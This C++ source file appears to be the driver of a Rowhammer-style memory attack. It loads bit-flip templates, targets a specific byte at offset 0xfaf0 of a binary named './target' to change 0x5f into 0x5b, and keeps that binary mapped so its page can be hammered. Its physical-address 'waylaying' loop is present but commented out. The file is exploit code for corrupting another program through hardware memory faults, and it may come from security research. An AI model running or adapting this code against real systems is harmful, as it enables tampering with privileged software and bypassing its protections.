#include "libhammer.h"
#include "set"

using namespace std;

uint64_t current_pa, step = 0;

void hold_binary(const string &path)
{
    int fd;
    unsigned sz;
    struct stat st;
    void *image;

    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
    //mlock(image, sz);
}

int main(void)
{
    BinaryInfo target;

    target.path = "./target";
    target.flip_to = 0;
    target.offset = 0xfaf0;     // 0xf000 + 2800d
    target.orig = 0x5f;
    target.target = 0x5b;
    // 1. find template position to put binary file in
    load_hammer_result("hammer_result.csv");
    vector<HammerResult> tmpl = find_template(target);
    map<uint64_t, HammerResult> paset;
    set<uint64_t> waylaying_set;
    int uniq = 0, cnt = 0;
    uint64_t min_pa, max_pa, waylaying_offset;
    myclock myclk;
    string dummy;

    waylaying_offset = target.offset & ~0xfffull;
    cout << "- press key to start waylaying" << endl;
    cin >> dummy;
    //exit(0);
    /*
    if (tmpl.size() > 0)
    {
        // 2. waylaying
        for (HammerResult r : tmpl)
             paset[r.base] = r;

        // file+waylaying_offset should be on pa=HammerResult.base
        current_pa = get_binary_pa(target.path, waylaying_offset);
        min_pa = max_pa = current_pa;
        cout << "* current_pa = " << hex << current_pa << endl;
        //exit(0);
        START_CLOCK(myclk, CLOCK_MONOTONIC);
        while (paset.count(current_pa) == 0)
        {
            ++step;
            relocate_fadvise(target.path);
            current_pa = get_binary_pa(target.path, waylaying_offset);
            if (current_pa < min_pa) min_pa = current_pa;
            if (current_pa > max_pa) max_pa = current_pa;
            END_CLOCK(myclk);
            waylaying_set.insert(current_pa);
            cout << "+ step " << dec << step << ": " << hex << current_pa
                 << dec << " coverage: " << uniq*4 << "k / " << (max_pa - min_pa)/1024 << " k, uptime: "
                 << (myclk.t1.tv_sec - myclk.t0.tv_sec) << "s." << endl;

            if (waylaying_set.size() == uniq)
                ++cnt;
            else cnt=0;
            if (cnt > 10)
            {
                cout << "* waylaying...";
                waylaying();
                cnt=0;
            }

            uniq = waylaying_set.size();
        }
    }
    cout << "* Success: target pa=0x" << hex << current_pa << ", hammer template=";
    paset[current_pa].print();
    */
    cout << "- Hold the target..." << endl;
    hold_binary(target.path);
    cin >> dummy;
    cout << "- Exiting..." << endl;
    return 0;
}
